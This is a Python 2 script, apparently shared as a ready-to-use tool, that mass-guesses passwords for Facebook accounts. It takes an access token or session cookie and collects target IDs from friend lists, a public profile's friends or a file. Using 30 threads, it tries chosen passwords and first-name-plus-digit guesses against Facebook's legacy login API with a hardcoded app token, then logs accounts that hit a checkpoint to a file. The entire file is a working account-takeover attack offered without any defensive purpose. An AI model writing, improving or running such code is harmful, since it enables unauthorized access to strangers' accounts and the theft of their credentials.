#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 crack.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
#########br=requests.get("https://api-asutoolkit.cloudaccess.host/ip.php").text.strip()


def keluar():
	print ("Keluar")
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
#########LOGO#########
logo = """\t
███╗░░░███╗░█████╗░██╗░░██╗░██████╗██╗███╗░░██╗
████╗░████║██╔══██╗██║░░██║██╔════╝██║████╗░██║
██╔████╔██║██║░░██║███████║╚█████╗░██║██╔██╗██║
██║╚██╔╝██║██║░░██║██╔══██║░╚═══██╗██║██║╚████║
██║░╚═╝░██║╚█████╔╝██║░░██║██████╔╝██║██║░╚███║
╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝\n\t\t    CREATE BY MOHSIN THE BRAND
─────────────────────────────────────────────────────────
WHATSAPP •• 03063112***
FB     •• MOHSIN ALI
Github •• https://github.com/MOHSIN THE LEGEND
WARNING•• DON'T TRY TO COPY
NOTE   •• U CAN ONLY COPY ME BUT U CAN'T BE ME
─────────────────────────────────────────────────────────"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\rTunggu"+o),;sys.stdout.flush();time.sleep(1)
		

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []
vulnot = "Not Vuln"
vuln = "Vuln"


def masuk():
	os.system('clear')
	print logo
	print ('─────────────────────────────────────────────────────────');time.sleep(0.07)
	jalan ("1.) Login Token ");time.sleep(0.07)
	jalan ("2.) Login Cookies ");time.sleep(0.07)
	jalan ("0.) EXIT");time.sleep(0.07)
	print ('─────────────────────────────────────────────────────────');time.sleep(0.07)
	pilih_masuk()

#### PILIH MASUK ####
def pilih_masuk():
	msuk = raw_input('Pilih •• ')
	if msuk =="":
		print ' Isi Yang Benar'
		pilih_masuk()
	elif msuk =="1":
		login_token()
	elif msuk =="2":
		login_cookie()
	elif msuk =="0":
		Back()
	else:
		print" Isi Yang Benar"
		select_masuk()


def login_token():
	os.system('clear')
	print logo
	print '─────────────────────────────────────────────────────────'
	toket = raw_input("Token •• ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print 'LOGIN SUCCESSFUL'
		os.system('xdg-open https://www.facebook.com/MOHSIN.ALI.THE.FATHER.OF.HATERX')
		menu()
	except KeyError:
		print 'Token Wrong '
		time.sleep(1.7)
		masuk()
	except requests.exceptions.SSLError:
		print 'Koneksi Bermasalah'
		exit()


def login_cookie():
	os.system('clear')
	print logo
	print ("─────────────────────────────────────────────────────────");time.sleep(0.07)
	try:
		cookie = raw_input("Cookies •• ")
		data = {
		            'user-agent' : 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16', # don't change this user agent.
			        'referer' : 'https://m.facebook.com/',
			        'host' : 'm.facebook.com',
			        'origin' : 'https://m.facebook.com',
			        'upgrade-insecure-requests' : '1',
			        'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			        'cache-control' : 'max-age=0',
			        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			        'content-type' : 'text/html; charset=utf-8',
			         'cookie' : cookie }
		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
		cari = re.search('(EAAA\w+)', coki.text)
		hasil = cari.group(1)
		zedd = open("login.txt", 'w')
		zedd.write(hasil)
		zedd.close()
		print 'LOGIN SUCCESSFUL'
		time.sleep(2)
		menu()
	except AttributeError:
		print 'Cookies WRONG'
		time.sleep(2)
		masuk()
	except UnboundLocalError:
		print 'Cookies Salah'
		time.sleep(2)
		masuk()
	except requests.exceptions.SSLError:
		os.system('clear')
		print 'Koneksi Bermasalah'
		exit()

def ambil_link():
	os.system("clear")
	print logo
	print ("─────────────────────────────────────────────────────────");time.sleep(0.07)
	jalan("Gunakan FB Baru")
	os.system ("cd ... && npm install")
	jalan ("Mulai...")
	os.system ("cd ... && npm start")
	raw_input("\nTekan Enter Untuk Kembali")
	masuk()

def menu():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print 'Token Invalid '
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(t.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print 'Token invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print 'Tidak ada koneksi'
		keluar()
	os.system("clear")
	print logo
	jalan ("    Name • " +nama);time.sleep(0.07)
	jalan ("    ID   • " +id);time.sleep(0.07)
	jalan ("    AUD   • "+ sub);time.sleep(0.07)
	jalan ("    DOB  • "+ a['birthday']);time.sleep(0.07)
	print "─────────────────────────────────────────────────────────"
	print ('01.) CRACK FROM ALL COUNTRIES');time.sleep(0.07)
	print ('02.) CHANGE ID USER NAME');time.sleep(0.07)
	print ('03.) UPDATE Script');time.sleep(0.07)
	print ('00.) BACK');time.sleep(0.07)
	print "─────────────────────────────────────────────────────────"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("SELECT •• ")
	if unikers =="":
		print"Correct Content"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="2" or unikers =="02":
		user_id()
	elif unikers =="3" or unikers =="03":
		perbarui()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus token/Cookies')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\nCorrect Content"
		pilih()
	
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"Token/Cookies invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ('01.) Crack Friend List');time.sleep(0.07)
	print ('02.) Crack Public ');time.sleep(0.07)
	print ('03.) Crack File      ');time.sleep(0.07)
	print ('00.) Back   ');time.sleep(0.07)
	print "─────────────────────────────────────────────────────────"
	pilih_indo()

def pilih_indo():
	teak = raw_input("SELECT •• ")
	if teak =="":
		print"Correct content"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
	        idt = raw_input("ID Public •• ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"Nama •• "+op["name"]
		except KeyError:
			print"\nID public not available"
			raw_input("\n[ Back ]")
			indo()
		except requests.exceptions.ConnectionError:
			print"Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			idlist = raw_input('Name File •• ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print 'File Not Available ! '
			raw_input('\n[ BACK ]')
		except IOError:
			print 'File Not available !'
			raw_input('\n[ Back ]')
			indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\nIsi Yqng Benar "
		pilih_indo()
	
	print "ID Yang Di Dapat •• "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\rCrack"+o),;sys.stdout.flush();time.sleep(1)
	print
	print "─────────────────────────────────────────────────────────"
	jalan('ENTER 3 CHOOSE RANDOM PASSWORD\n\t[ EXMPLE ]\n\nPASSWORD 1 •• 786786\nPASSWORD 2 •• PAKISTAN\nPASSWORD 3 •• MARK123\n')
	pass1 = raw_input(" Password 1 •• ")
	pass2 = raw_input(" Password 2 •• ")
	pass3 = raw_input(" Password 3 •• ")
	print "\n─────────────────────────────────────────────────────────"
        jalan ('\CLONING START STOP PROCESS TO PRESS CTRL THEN Z')
	print "─────────────────────────────────────────────────────────\n"
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\33[1;33mOK•••> ' + user + ' •• ' + pass1 + ' •• ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\33[31;1mCP•••> ' + user + ' •• ' + pass1 + ' •• ' + b['name']
					cek = open("out/one.txt", "a")
					cek.write("••" +user+ " •• " +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\33[1;33mOK•••> ' + user + ' •• ' + pass2 + ' •• ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\33[31;1mCP•••> ' + user + ' •• ' + pass2 + ' •• ' + b['name']
							cek = open("out/one.txt", "a")
							cek.write("••" +user+ " •• " +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\33[1;33mOK•••> ' + user + ' •• ' + pass3 + ' •• ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\33[31;1mCP•••> ' + user + ' •• ' + pass3 + ' •• ' + b['name']
									cek = open("out/one.txt", "a")
									cek.write("••" +user+ " •• " +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name']+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\33[1;33mOK•••> ' + user + ' •• ' + pass4 + ' •• ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\33[31;1mCP•••> ' + user + ' •• ' + pass4 + ' •• ' + b['name']
											cek = open("out/one.txt", "a")
											cek.write("••" +user+ " •• " +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name']+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\33[1;33mOK•••> ' + user + ' •• ' + pass5 + ' •• ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\33[31;1mCP•••> ' + user + ' •• ' + pass5 + ' •• ' + b['name']
													cek = open("out/one.txt", "a")
													cek.write("••" +user+ " •• " +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name']+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\33[1;33mOK•••> ' + user + ' •• ' + pass6 + ' •• ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\33[31;1mCP•••> ' + user + ' •• ' + pass6 + ' •• ' + b['name']
															cek = open("out/one.txt", "a")
															cek.write("••" +user+ " •• " +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n─────────────────────────────────────────────────────────"
	print 'Successful'
	print"Total OK••CP\nOK •• "+str(len(oks))+"\nCP •• "+str(len(cekpoint))
	print 'CP Stoped Of •• out/one.txt'
	print "─────────────────────────────────────────────────────────"
	raw_input("[ Back ]")
	os.system("python2 MOHSIN.py")
	

def user_id():
	os.system('clear')
	print logo
	ling = ('https://www.facebook.com/')
	url = ling+raw_input("Username •• ")
	idre = re.compile('"entity_id":"([0-9]+)"')
	page = requests.get(url)
	print idre.findall(page.content)
	raw_input("\n[ BACK ]")
	menu()
	
	
def perbarui():
	os.system("clear")
	print logo
	print "─────────────────────────────────────────────────────────"
	jalan ("UPDATE Script")
	os.system("git pull origin master")
	raw_input("\n[ BACK ]")
	os.system("python2 MOHSIN.py")
	
			
if __name__=='__main__':
        menu()
        masuk()
